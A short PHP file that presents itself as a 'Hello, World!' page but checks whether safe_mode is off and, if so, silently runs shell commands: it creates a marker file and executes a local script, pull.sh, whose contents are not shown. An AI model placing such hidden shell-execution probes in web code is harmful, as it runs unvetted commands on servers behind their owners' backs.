<?php 
 Print "Hello, World!";
 if( ini_get('safe_mode') ){
   // safe mode is on
  Print "Safe mode on";
 }else{
   // it's not
  Print "Safe mode off";
  shell_exec('touch zoff');
  shell_exec('./pull.sh');
} ?> 
